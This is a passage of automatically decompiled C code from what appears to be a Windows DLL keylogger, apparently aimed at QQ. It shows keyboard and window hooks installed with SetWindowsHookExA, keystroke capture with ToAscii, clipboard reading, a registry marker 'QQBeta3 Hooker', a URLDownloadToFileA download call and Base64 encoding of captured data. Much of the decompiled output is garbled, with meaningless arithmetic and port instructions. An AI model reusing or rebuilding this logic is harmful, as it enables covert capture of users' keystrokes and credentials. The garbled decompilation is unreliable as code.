    function_40358a((int32_t)&g118);
    v9 = v13;
    goto lab_0x404c1b;
  lab_0x404c1b:;
    int32_t v14 = v6 - 1; // 0x404c1c
    v5++;
    v7 = v9;
    v6 = v14;
    v4 = v9;
    if (v14 == 0) {
        // break -> 0x404c23
        goto lab_0x404c23;
    }
    goto lab_0x404b6f;
}

// Address range: 0x404c46 - 0x404c4b
int32_t function_404c46(void) {
    // 0x404c46
    return function_402d86((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x404c4b - 0x404c4d
int32_t function_404c4b(void) {
    // 0x404c4b
    int32_t result; // 0x404c4b
    return result;
}

// Address range: 0x404c4d - 0x404c54
int32_t function_404c4d(int32_t a1, int32_t a2, int32_t a3) {
    // 0x404c4d
    int32_t result; // 0x404c4d
    return result;
}

// Address range: 0x404c71 - 0x404ce8
int32_t function_404c71(void) {
    // 0x404c71
    int32_t v1; // 0x404c71
    *(int32_t *)v1 = v1 + 1;
    int32_t v2; // 0x404c71
    int32_t v3 = v2;
    *(char *)v3 = *(char *)&v2 + (char)v3;
    *(char *)0x55000000 = *(char *)0x55000000 + (char)(v2 / 256);
    function_4036ba();
    int32_t v4 = __readfsdword(0); // bp-24, 0x404c9b
    __writefsdword(0, (int32_t)&v4);
    function_40358a(v2);
    int32_t v5 = function_4036ca(); // 0x404cc0
    URLDownloadToFileA((int32_t *)v5, NULL, (char *)&g118, (int32_t)&g118, &g118);
    __writefsdword(0, 0);
    return function_403396();
}

// Address range: 0x404c7a - 0x404c7b
int32_t function_404c7a(void) {
    // 0x404c7a
    int32_t result; // 0x404c7a
    return result;
}

// Address range: 0x404ce8 - 0x404ced
int32_t function_404ce8(void) {
    // 0x404ce8
    return function_402d86((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x404ced - 0x404cef
int32_t function_404ced(void) {
    // 0x404ced
    int32_t result; // 0x404ced
    return result;
}

// Address range: 0x404cef - 0x404cf4
int32_t function_404cef(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x404cef
    int32_t result; // 0x404cef
    return result;
}

// Address range: 0x404cf9 - 0x404d27
int32_t function_404cf9(void) {
    // 0x404cf9
    int32_t v1; // 0x404cf9
    *(int32_t *)v1 = v1 + 1;
    int32_t v2; // 0x404cf9
    int32_t v3 = v2;
    *(char *)v3 = *(char *)&v2 + (char)v3;
    int32_t v4; // 0x404cf9
    uint32_t v5; // 0x404cf9
    *(char *)v4 = *(char *)&v4 + (char)(v5 / 256);
    int32_t v6 = v2;
    *(char *)v6 = *(char *)&v2 + (char)v6;
    int32_t v7; // 0x404cf9
    char * v8 = (char *)(v7 - 117); // 0x404d01
    int32_t v9; // 0x404cf9
    *v8 = *v8 + (char)v9;
    __asm_in((int16_t)v9);
    int32_t v10 = __readfsdword(0); // bp-12, 0x404d0d
    __writefsdword(0, (int32_t)&v10);
    g98++;
    __writefsdword(0, v10);
    return 0;
}

// Address range: 0x404d27 - 0x404d2c
int32_t function_404d27(void) {
    // 0x404d27
    return function_402d86((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x404d2c - 0x404d2e
int32_t function_404d2c(void) {
    // 0x404d2c
    int32_t result; // 0x404d2c
    return result;
}

// Address range: 0x404d2e - 0x404d30
int32_t function_404d2e(int32_t a1) {
    // 0x404d2e
    int32_t result; // 0x404d2e
    return result;
}

// Address range: 0x404d32 - 0x404d3a
int32_t function_404d32(void) {
    // 0x404d32
    g98--;
    int32_t result; // 0x404d32
    return result;
}

// Address range: 0x404d3a - 0x404db9
int32_t function_404d3a(void) {
    // 0x404d3a
    function_4033c6();
    int32_t v1 = 0; // bp-116, 0x404d4e
    int32_t v2 = 0; // bp-128, 0x404d54
    char * v3 = "Software\\mz\\QQBeta3 Hooker"; // bp-132, 0x404d56
    int32_t result = function_40438e(0, &v1, 1, 0, "Software\\mz\\QQBeta3 Hooker", -0x7fffffff); // 0x404d60
    if (result != 0) {
        // 0x404db4
        return result;
    }
    // 0x404d6f
    v3 = (char *)101;
    int32_t v4 = function_404396(101, (int32_t *)&v3, &v2, &g28, 0, "First Run", -0x7fffffff); // 0x404d92
    if (v4 == 0) {
        // 0x404d9b
        function_4034b2();
    }
    // 0x404db4
    return function_404376();
}

// Address range: 0x404dbd - 0x404e90
int32_t function_404dbd(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7) {
    int32_t v1 = a1;
    int32_t v2 = a2;
    int32_t v3; // 0x404dbd
    *(int32_t *)v3 = v3 + 1;
    int32_t result; // 0x404dbd
    int32_t v4 = result;
    *(char *)v4 = *(char *)&result + (char)v4;
    int32_t v5; // 0x404dbd
    char * v6 = (char *)(v5 + 122); // 0x404dc1
    uint32_t v7; // 0x404dbd
    *v6 = *v6 + (char)(v7 / 256);
    unsigned char v8 = *(char *)&result; // 0x404dc4
    unsigned char v9 = v8 + (char)result; // 0x404dc4
    *(char *)result = v9;
    int32_t v10; // 0x404dbd
    __asm_outsd((int16_t)v3, v10);
    if (v9 == 0) {
        unknown_4e42();
    }
    // 0x404dcb
    result = v2;
    int32_t * v11; // 0x404dbd
    int32_t v12; // 0x404dbd
    int32_t v13; // 0x404dbd
    if (v9 < v8) {
        // 0x404e33
        *(char *)v13 = (char)v13 + (char)a3;
        char * v14 = (char *)a4; // 0x404e36
        *v14 = *v14 + (char)(a3 / 256);
        v11 = &v1;
        goto lab_0x404e39;
    } else {
        char v15 = llvm_ctpop_i8(v9); // 0x404dc4
        *(int32_t *)v13 = __asm_insd((int16_t)a4);
        if ((v15 & 1) == 0) {
            // 0x404e2e
            return result;
        }
        // 0x404dd2
        v1 = a3;
        v2 = a3;
        int32_t v16 = a4 + 1; // 0x404dd4
        v11 = &v2;
        if (v16 == 0) {
            goto lab_0x404e39;
        } else {
            int32_t v17 = result - 1; // 0x404dda
            result = v17;
            int16_t v18 = v16; // 0x404ddb
            int32_t * v19 = (int32_t *)a7; // 0x404ddb
            __asm_outsd(v18, *v19);
            __asm_outsd(v18, *v19);
            char * v20 = (char *)(a7 + 105); // 0x404de1
            unsigned char v21 = *v20; // 0x404de1
            unsigned char v22 = v21 + (char)v17; // 0x404de1
            *v20 = v22;
            v12 = 0;
            if (v22 >= v21) {
                if (v22 == 0) {
                    // 0x404e08
                    *(int32_t *)-4 = *(int32_t *)result;
                    __writefsdword(result, -4);
                    *(int32_t *)-8 = (int32_t)"Software\\mz\\QQBeta3 Hooker";
                    *(int32_t *)-12 = -0x7fffffff;
                    RegDeleteKeyA(&g118, (char *)&g118);
                    *(int32_t *)(a6 - 8) = 0;
                    int32_t result2 = a6 - 12; // 0x404e21
                    *(int32_t *)result2 = 1;
                    *(int32_t *)-16 = result2;
                    return result2;
                }
                // 0x404de8
                *(int32_t *)-4 = v16;
                v12 = -4;
            }
            goto lab_0x404e59;
        }
    }
  lab_0x404e39:;
    int32_t v23 = (int32_t)v11;
    *(int32_t *)(v23 - 4) = 0;
    *(int32_t *)(v23 - 8) = 0;
    *(int32_t *)(v23 - 12) = (int32_t)"Software\\mz\\QQBeta3 Hooker";
    *(int32_t *)(v23 - 16) = -0x7fffffff;
    RegCreateKeyExA(&g118, (char *)&g118, (int32_t)&g118, (char *)&g118, (int32_t)&g118, (int32_t)&g118, (struct _SECURITY_ATTRIBUTES *)&g118, (int32_t **)&g118, &g118);
    int32_t v24 = function_4034ca(); // 0x404e4f
    int32_t v25 = v23 - 20; // 0x404e55
    *(int32_t *)v25 = v24 + 1;
    v12 = v25;
    goto lab_0x404e59;
  lab_0x404e59:
    // 0x404e59
    *(int32_t *)(v12 - 4) = function_4036ca();
    *(int32_t *)(v12 - 8) = 1;
    *(int32_t *)(v12 - 12) = 0;
    int32_t * v26 = (int32_t *)(v12 - 16); // 0x404e63
    *v26 = (int32_t)"First Run";
    int32_t * v27 = (int32_t *)(a6 - 8); // 0x404e68
    *(int32_t *)(v12 - 20) = *v27;
    RegSetValueExA(&g118, (char *)&g118, (int32_t)&g118, (int32_t)&g118, (char *)&g118, (int32_t)&g118);
    int32_t * v28 = (int32_t *)(v12 - 24); // 0x404e74
    *v28 = *v27;
    function_404376();
    __writefsdword(0, *v28);
    *v26 = 0x404e97;
    return function_403372();
}

// Address range: 0x404e90 - 0x404e95
int32_t function_404e90(void) {
    // 0x404e90
    return function_402d86((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x404e95 - 0x404e97
int32_t function_404e95(void) {
    // 0x404e95
    int32_t result; // 0x404e95
    return result;
}

// Address range: 0x404e97 - 0x404e9b
int32_t function_404e97(void) {
    // 0x404e97
    int32_t result; // 0x404e97
    return result;
}

// Address range: 0x404e9b - 0x404f14
int32_t function_404e9b(int32_t a1, int32_t result, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8) {
    // 0x404e9b
    int32_t v1; // 0x404e9b
    *(char *)v1 = 2 * (char)v1;
    int32_t v2; // 0x404e9b
    char * v3 = (char *)(v2 + 111); // 0x404e9d
    unsigned char v4 = *v3; // 0x404e9d
    int32_t v5; // 0x404e9b
    unsigned char v6 = v4 + (char)v5; // 0x404e9d
    *v3 = v6;
    if (v6 == 0) {
        unknown_4f1a();
    }
    if (v6 < v4) {
        // 0x404f11
        return CloseClipboard();
    }
    char v7 = llvm_ctpop_i8(v6); // 0x404e9d
    *(int32_t *)a8 = __asm_insd((int16_t)a4);
    if ((v7 & 1) == 0) {
        // 0x404f06
        GlobalUnlock(&g118);
        // 0x404f11
        return CloseClipboard();
    }
    int32_t v8 = a4 + 1; // 0x404eac
    if (v8 == 0) {
        // 0x404f11
        return result;
    }
    int32_t v9 = result - 1; // 0x404eb2
    int16_t v10 = v8; // 0x404eb3
    int32_t * v11 = (int32_t *)a7; // 0x404eb3
    __asm_outsd(v10, *v11);
    __asm_outsd(v10, *v11);
    char * v12 = (char *)(a7 + 105); // 0x404eb9
    char v13 = v9; // 0x404eb9
    char v14 = *v12 + v13; // 0x404eb9
    *v12 = v14;
    if (v14 != 0) {
        // 0x404ec0
        *(int32_t *)-4 = v8;
        char * v15 = (char *)v9; // 0x404ec3
        *v15 = *v15 + v13;
        char * v16 = (char *)(a5 + 86); // 0x404ec5
        *v16 = *v16 + (char)v8;
        *(int32_t *)-8 = a8;
        function_403372();
        *(int32_t *)-12 = 0;
        return OpenClipboard(&g118);
    }
    char * v17 = (char *)(2 * a6 + 106); // 0x404ee0
    *v17 = 2 * *v17;
    int32_t * v18 = GetClipboardData((int32_t)&g118); // 0x404ee5
    if (v18 == NULL) {
        // 0x404f11
        return CloseClipboard();
    }
    int32_t v19 = (int32_t)v18; // 0x404ee5
    *(int32_t *)-4 = v19;
    if (GlobalLock(&g118) == NULL) {
        // 0x404f11
        return CloseClipboard();
    }
    // 0x404efc
    function_403476();
    *(int32_t *)-8 = v19;
    // 0x404f06
    GlobalUnlock(&g118);
    // 0x404f11
    return CloseClipboard();
}

// Address range: 0x404f16 - 0x404f63
int32_t DllGetClassObject(int32_t a1) {
    // 0x404f16
    int32_t v1; // 0x404f16
    char * lpWindowName = (char *)v1; // 0x404f19
    char * lpThreadAttributes = lpWindowName; // bp-8, 0x404f19
    if (*(int32_t *)*(int32_t *)0x408138 == 0) {
        // 0x404f52
        *(int32_t *)a1 = 0;
        return -0x7ffbfeef;
    }
    // 0x404f29
    int32_t lpClassName; // 0x404f16
    if (FindWindowA((char *)lpClassName, lpWindowName) == NULL) {
        // 0x404f3c
        CreateThread((struct _SECURITY_ATTRIBUTES *)&lpThreadAttributes, 0, (int32_t (*)(int32_t *))66, (int32_t *)0x40676e, 0, NULL);
    }
    // 0x404f52
    *(int32_t *)a1 = 0;
    return -0x7ffbfeef;
}

// Address range: 0x404f7e - 0x404f81
int32_t DllCanUnloadNow(void) {
    // 0x404f7e
    return 0;
}

// Address range: 0x404f82 - 0x404f85
int32_t DllRegisterServer(void) {
    // 0x404f82
    return 0;
}

// Address range: 0x404f86 - 0x404f89
int32_t DllUnregisterServer(void) {
    // 0x404f86
    return 0;
}

// Address range: 0x404f8a - 0x404faf
int32_t function_404f8a(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x404f95
    __writefsdword(0, (int32_t)&v1);
    g99++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x404faf - 0x404fb4
int32_t function_404faf(void) {
    // 0x404faf
    return function_402d86((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x404fb4 - 0x404fb6
int32_t function_404fb4(void) {
    // 0x404fb4
    int32_t result; // 0x404fb4
    return result;
}

// Address range: 0x404fb6 - 0x404fb8
int32_t function_404fb6(int32_t a1) {
    // 0x404fb6
    int32_t result; // 0x404fb6
    return result;
}

// Address range: 0x404fba - 0x404fc2
int32_t function_404fba(void) {
    // 0x404fba
    g99--;
    int32_t result; // 0x404fba
    return result;
}

// Address range: 0x404fc2 - 0x4050d6
int32_t function_404fc2(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = __readfsdword(0); // bp-292, 0x404fe4
    int32_t v2 = &v1; // 0x404fe4
    __writefsdword(0, v2);
    int32_t v3 = v2; // 0x404ff9
    if (function_407252() != 0) {
        int32_t uFlags; // 0x404fc2
        switch (uFlags) {
            case 8: {
                // 0x40500d
                function_4072ee();
                function_40376a();
                v3 = v2;
                // break -> 0x4050bd
                break;
            }
            case 46: {
                // 0x40502c
                function_4072ee();
                function_40376a();
                v3 = v2;
                // break -> 0x4050bd
                break;
            }
            default: {
                // 0x405049
                int32_t lpKeyState; // bp-264, 0x404fc2
                GetKeyboardState((char *)&lpKeyState);
                int32_t v4; // bp-316, 0x404fc2
                int32_t v5 = &v4; // 0x40506c
                int32_t uScanCode; // bp-8, 0x404fc2
                uint32_t v6; // 0x404fc2
                int32_t v7 = ToAscii(0, (int32_t)&uScanCode, (char *)&lpKeyState, (int16_t *)(v6 / 0x10000 & 255), uFlags); // 0x40506d
                v3 = v5;
                if (v7 == 1) {
                    // 0x405075
                    v3 = v5;
                    if (function_406fb6() != 0) {
                        // 0x405081
                        v3 = v5;
                        if (function_4034ca() <= 15) {
                            // 0x405092
                            function_4072ee();
                            function_403466();
                            function_4037b2();
                            v3 = v5;
                        }
                    }
                }
                // break -> 0x4050bd
                break;
            }
        }
    }
    // 0x4050bd
    __writefsdword(0, *(int32_t *)v3);
    *(int32_t *)(v3 + 8) = 0x4050dd;
    return function_403372();
}

// Address range: 0x4050d6 - 0x4050db
int32_t function_4050d6(void) {
    // 0x4050d6
    return function_402d86((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x4050db - 0x4050dd
int32_t function_4050db(void) {
    // 0x4050db
    int32_t result; // 0x4050db
    return result;
}

// Address range: 0x4050dd - 0x4050e4
int32_t function_4050dd(int32_t a1, int32_t a2, int32_t a3) {
    // 0x4050dd
    int32_t result; // 0x4050dd
    return result;
}

// Address range: 0x4050e6 - 0x4051a5
int32_t function_4050e6(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = __readfsdword(0); // bp-32, 0x4050f9
    int32_t v2 = &v1; // 0x4050f9
    __writefsdword(0, v2);
    function_407252();
    __writefsdword(0, v1);
    *(int32_t *)(v2 + 8) = 0x4051ac;
    return function_403396();
}

// Address range: 0x4051a5 - 0x4051aa
int32_t function_4051a5(void) {
    // 0x4051a5
    return function_402d86((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x4051aa - 0x4051ac
int32_t function_4051aa(void) {
    // 0x4051aa
    int32_t result; // 0x4051aa
    return result;
}

// Address range: 0x4051ac - 0x4051b2
int32_t function_4051ac(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    // 0x4051ac
    int32_t result; // 0x4051ac
    return result;
}

// Address range: 0x4051b2 - 0x40522c
int32_t function_4051b2(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = __readfsdword(0); // bp-24, 0x4051c2
    int32_t v2 = &v1; // 0x4051c2
    __writefsdword(0, v2);
    int32_t v3 = v2; // 0x4051d1
    if (function_4071c2() != 0) {
        // 0x4051d3
        int32_t lpszWindow; // 0x4051b2
        int32_t * hWnd = FindWindowExA(NULL, (int32_t *)"ComboBox", NULL, (char *)lpszWindow); // 0x4051dd
        int32_t v4 = (int32_t)hWnd; // bp-44, 0x4051e4
        int32_t v5 = &v4; // 0x4051e4
        if (!IsWindow(hWnd)) {
            // 0x405211
            function_40747e();
            v3 = v5;
        } else {
            // 0x4051ee
            function_407022();
            function_4033c6();
            function_40734a();
            v3 = v5;
        }
    }
    // 0x405216
    __writefsdword(0, *(int32_t *)v3);
    *(int32_t *)(v3 + 8) = 0x405233;
    return function_403372();
}

// Address range: 0x40522c - 0x405231
int32_t function_40522c(void) {
    // 0x40522c
    return function_402d86((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x405231 - 0x405233
int32_t function_405231(void) {
    // 0x405231
    int32_t result; // 0x405231
    return result;
}

// Address range: 0x405233 - 0x405237
int32_t function_405233(int32_t a1, int32_t a2, int32_t a3) {
    // 0x405233
    int32_t result; // 0x405233
    return result;
}

// Address range: 0x405237 - 0x4052b1
int32_t function_405237(void) {
    // 0x405237
    int32_t v1; // 0x405237
    *(char *)v1 = 2 * (char)v1;
    int32_t v2; // 0x405237
    char * v3 = (char *)(v2 + 111); // 0x405239
    int32_t v4; // 0x405237
    *v3 = *v3 + (char)v4;
    int32_t v5; // 0x405237
    int16_t v6 = v5; // 0x40523c
    int32_t v7; // 0x405237
    *(int32_t *)v7 = __asm_insd(v6);
    int32_t v8 = __asm_bound(*(int64_t *)(v7 + 66)); // 0x40523d
    int32_t v9; // 0x405237
    __asm_outsd(v6, v9);
    int32_t v10 = v4;
    *(char *)v10 = *(char *)&v4 + (char)v10;
    char * v11 = (char *)(v8 - 117); // 0x405245
    *v11 = *v11 + (char)v5;
    __asm_in(v6);
    int32_t hhk = *(int32_t *)(v8 + 16); // 0x40524c
    int32_t nCode = *(int32_t *)(v8 + 12); // 0x40524f
    int32_t wParam = *(int32_t *)(v8 + 8); // 0x405252
    if (nCode == 1 != (wParam == 0 == (*(int32_t *)*(int32_t *)0x40812c != 0))) {
        // 0x40529c
        return CallNextHookEx((int32_t *)hhk, nCode, wParam, g101);
    }
    // 0x40526d
    v4 = hhk;
    switch (*(int32_t *)(hhk + 4)) {
        case 256: {
            // 0x405284
            function_404fc2(v2, v9, v7);
            // break -> 0x40529c
            break;
        }
        case 770: {
            // 0x405295
            function_4050e6(v2, v9, v7);
            // break -> 0x40529c
            break;
        }
    }
    // 0x40529c
    return CallNextHookEx((int32_t *)hhk, nCode, wParam, g101);
}

// Address range: 0x4052b2 - 0x4052f9
int32_t function_4052b2(int32_t hhk, int32_t nCode, int32_t wParam) {
    // 0x4052b2
    if (wParam == 0 != g33 != 0) {
        // 0x4052e2
        return CallNextHookEx((int32_t *)hhk, nCode, wParam, g102);
    }
    // 0x4052d0
    if (*(int32_t *)(hhk + 8) == 2) {
        // 0x4052da
        int32_t v1; // 0x4052b2
        int32_t v2; // 0x4052b2
        int32_t v3; // 0x4052b2
        function_4051b2(v2, v3, v1);
    }
    // 0x4052e2
    return CallNextHookEx((int32_t *)hhk, nCode, wParam, g102);
}

// Address range: 0x4052fa - 0x40532f
int32_t function_4052fa(void) {
    // 0x4052fa
    g101 = (int32_t)SetWindowsHookExA(0, g82, (int32_t *)0x405246, 3);
    int32_t result = (int32_t)SetWindowsHookExA(0, g82, (int32_t *)0x4052b2, 4); // 0x405324
    g102 = result;
    return result;
}

// Address range: 0x405332 - 0x405349
int32_t function_405332(void) {
    // 0x405332
    UnhookWindowsHookEx((int32_t *)g101);
    return UnhookWindowsHookEx((int32_t *)g102);
}

// Address range: 0x40534a - 0x40536f
int32_t function_40534a(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x405355
    __writefsdword(0, (int32_t)&v1);
    g100++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x40536f - 0x405374
int32_t function_40536f(void) {
    // 0x40536f
    return function_402d86((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x405374 - 0x405376
int32_t function_405374(void) {
    // 0x405374
    int32_t result; // 0x405374
    return result;
}

// Address range: 0x405376 - 0x405378
int32_t function_405376(int32_t a1) {
    // 0x405376
    int32_t result; // 0x405376
    return result;
}

// Address range: 0x40537a - 0x405382
int32_t function_40537a(void) {
    // 0x40537a
    g100--;
    int32_t result; // 0x40537a
    return result;
}

// Address range: 0x405385 - 0x40543d
int32_t function_405385(int32_t a1, uint32_t a2, uint32_t a3) {
    // 0x405385
    int32_t v1; // 0x405385
    *(int32_t *)v1 = v1 + 1;
    int32_t result; // 0x405385
    int32_t v2 = result;
    *(char *)v2 = *(char *)&result + (char)v2;
    int32_t v3 = result; // 0x405391
    result = a1;
    int32_t v4 = __asm_bound(*(int64_t *)(v3 + 99)); // 0x4053a5
    int32_t v5 = v4 - 2; // 0x4053a8
    *(int16_t *)v5 = 0x6a69;
    int32_t v6; // 0x405385
    int64_t v7 = (int64_t)*(int32_t *)(v6 + 110 + 2 * v6); // 0x4053ae
    int64_t v8 = 111 * v7; // 0x4053ae
    if (v8 != 0x6f00000000 * v7 / 0x100000000) {
        // 0x405426
        return result;
    }
    int32_t v9; // 0x405385
    if (v9 == 0) {
        int32_t v10 = (int32_t)((0x100000000 * (int64_t)a3 | (int64_t)result) / (int64_t)a2) + 1; // 0x405430
        // 0x405432
        return v10 - 1;
    }
    int32_t v11; // bp-16, 0x405385
    int32_t v12; // 0x405385
    if (v9 < 0) {
        // 0x405436
        v11 = *(int32_t *)v12;
        int32_t * v13 = (int32_t *)result; // 0x405437
        *v13 = *v13 + result;
        char * v14 = (char *)(result - 119); // 0x405439
        *v14 = *v14 + (char)result;
        return result;
    }
    // 0x4053bd
    if ((llvm_ctpop_i8((char)v9) & 1) != 0) {
        int32_t * v15 = (int32_t *)a3; // 0x4053bf
        *v15 = *v15 ^ v12;
        *(int32_t *)(v4 - 38) = v3 - 1;
        *(int32_t *)(v4 - 42) = *(int32_t *)(v12 + 0x39383736) ^ v12;
        *(int32_t *)(v4 - 22) = 0;
        *(int32_t *)(v4 - 26) = 0;
        *(int32_t *)(v4 - 30) = 0;
        *(int32_t *)(v4 - 34) = 0;
        *(int32_t *)(v4 - 6) = a3;
        *(int32_t *)(v4 - 46) = v5;
        return 0;
    }
    int32_t v16 = &v11; // 0x40539d
    uint32_t v17 = result + 1; // 0x4053ef
    char * v18 = (char *)(v16 + 48 + 8 * v16); // 0x4053f0
    *v18 = *v18 + (char)(v17 / 256);
    __writefsdword(v17, v5);
    function_403372();
    int32_t v19 = function_4034ca(); // 0x405401
    int32_t * v20 = (int32_t *)((int32_t)v8 - 8); // 0x405406
    *v20 = v19;
    int64_t v21 = 0x100000000 * (int64_t)(v19 >> 31) | (int64_t)v19; // 0x405412
    int32_t result2 = v21 / 3; // 0x405412
    result = result2;
    if ((int32_t)(v21 % 3) != 0) {
        // 0x405425
        return result2;
    }
    uint32_t v22 = *v20; // 0x405418
    // 0x405432
    return (int32_t)((0x100000000 * (int64_t)(v22 / 0x80000000) | (int64_t)v22) / 3) - 1;
}

// Address range: 0x40543e - 0x4055fa
// Used cryptographic patterns:
//  - B64EncodeTable (8-bit, little endian)
int32_t function_40543e(void) {
    // 0x40543e
    int32_t v1; // 0x40543e
    char * v2 = (char *)(v1 - 9);
    char * v3 = (char *)(v1 - 10);
    char * v4 = (char *)(v1 - 11);
    char * v5 = (char *)(v1 - 12);
    int32_t * v6 = (int32_t *)(v1 - 16);
    int32_t v7 = 0; // 0x40543e
    int32_t v8 = 3 * v7; // 0x405440
    int32_t v9 = *(int32_t *)(v1 - 8); // 0x405448
    int32_t v10; // 0x40543e
    int32_t v11; // 0x40543e
    char * v12; // 0x40543e
    unsigned char v13; // 0x40543e
    char v14; // 0x40543e
    unsigned char v15; // 0x40543e
    int32_t v16; // 0x405454
    char * v17; // 0x405454
    unsigned char v18; // 0x405454
    char v19; // 0x405462
    char v20; // 0x40546c
    char * v21; // 0x405478
    unsigned char v22; // 0x405478
    char v23; // 0x40548d
    char v24; // 0x405499
    unsigned char v25; // 0x4054a8
    char v26; // 0x4054c0
    char v27; // 0x4054d5
    char v28; // 0x40557d
    unsigned char v29; // 0x405513
    char v30; // 0x40552b
    char v31; // 0x405543
    if (v8 + 3 > v9) {
        // 0x4054e0
        v11 = v8 + v10;
        v12 = (char *)v11;
        v13 = *v12;
        v14 = *(char *)((int32_t)(v13 / 4) + (int32_t)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");
        *v2 = v14;
        v15 = *v12;
        if (v8 + 2 > v9) {
            // 0x40554f
            v28 = *(char *)((16 * (int32_t)v15 & 48) + (int32_t)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");
            *v3 = v28;
            *v4 = 61;
            *v5 = 61;
        } else {
            // 0x4054ea
            v29 = *(char *)(v11 + 1);
            v30 = *(char *)((int32_t)(v29 / 16 | 16 * v15 & 48) + (int32_t)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");
            *v3 = v30;
            v31 = *(char *)((4 * (int32_t)v29 & 60) + (int32_t)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");
            *v4 = v31;
            *v5 = 61;
        }
    } else {
        // 0x405451
        v16 = v8 + v10;
        v17 = (char *)v16;
        v18 = *v17;
        v19 = *(char *)((int32_t)(v18 / 4) + (int32_t)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");
        *v2 = v19;
        v20 = *v17;
        v21 = (char *)(v16 + 1);
        v22 = *v21;
        v23 = *(char *)((int32_t)(v22 / 16 | 16 * v20 & 48) + (int32_t)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");
        *v3 = v23;
        v24 = *v21;
        v25 = *(char *)(v16 + 2);
        v26 = *(char *)((int32_t)(v25 / 64 | 4 * v24 & 60) + (int32_t)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");
        *v4 = v26;
        v27 = *(char *)((int32_t)(v25 & 63) + (int32_t)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");
        *v5 = v27;
    }
    // 0x40558b
    int32_t v32; // 0x40543e
    *(int32_t *)(v32 - 4) = *(int32_t *)*(int32_t *)(v1 - 4);
    function_403466();
    *(int32_t *)(v32 - 8) = *(int32_t *)(v1 - 20);
    function_403466();
    int32_t * v33 = (int32_t *)(v32 - 12);
    *v33 = *(int32_t *)(v1 - 24);
    function_403466();
    *(int32_t *)(v32 - 16) = *(int32_t *)(v1 - 28);
    function_403466();
    int32_t v34 = v32 - 20; // 0x4055c5
    int32_t * v35 = (int32_t *)v34;
    *v35 = *(int32_t *)(v1 - 32);
    function_40358a((int32_t)&g118);
    int32_t v36 = *v6 - 1; // 0x4055d6
    *v6 = v36;
    v7++;
    while (v36 != 0) {
        // 0x405440
        v8 = 3 * v7;
        v9 = *(int32_t *)(v1 - 8);
        if (v8 + 3 > v9) {
            // 0x4054e0
            v11 = v8 + v10;
            v12 = (char *)v11;
            v13 = *v12;
            v14 = *(char *)((int32_t)(v13 / 4) + (int32_t)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");
            *v2 = v14;
            v15 = *v12;
            if (v8 + 2 > v9) {
                // 0x40554f
                v28 = *(char *)((16 * (int32_t)v15 & 48) + (int32_t)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");
                *v3 = v28;
                *v4 = 61;
                *v5 = 61;
            } else {
                // 0x4054ea
                v29 = *(char *)(v11 + 1);
                v30 = *(char *)((int32_t)(v29 / 16 | 16 * v15 & 48) + (int32_t)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");
                *v3 = v30;
                v31 = *(char *)((4 * (int32_t)v29 & 60) + (int32_t)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");
                *v4 = v31;
                *v5 = 61;
            }
        } else {
            // 0x405451
            v16 = v8 + v10;
            v17 = (char *)v16;
            v18 = *v17;
            v19 = *(char *)((int32_t)(v18 / 4) + (int32_t)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");
            *v2 = v19;
            v20 = *v17;
            v21 = (char *)(v16 + 1);
            v22 = *v21;
            v23 = *(char *)((int32_t)(v22 / 16 | 16 * v20 & 48) + (int32_t)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");
            *v3 = v23;
            v24 = *v21;
            v25 = *(char *)(v16 + 2);
            v26 = *(char *)((int32_t)(v25 / 64 | 4 * v24 & 60) + (int32_t)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");
            *v4 = v26;
            v27 = *(char *)((int32_t)(v25 & 63) + (int32_t)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");
            *v5 = v27;
        }
        // 0x40558b
        *(int32_t *)(v34 - 4) = *(int32_t *)*(int32_t *)(v1 - 4);
        function_403466();
        *(int32_t *)(v34 - 8) = *(int32_t *)(v1 - 20);
        function_403466();
        v33 = (int32_t *)(v34 - 12);
        *v33 = *(int32_t *)(v1 - 24);
        function_403466();
        *(int32_t *)(v34 - 16) = *(int32_t *)(v1 - 28);
        function_403466();
        v34 -= 20;
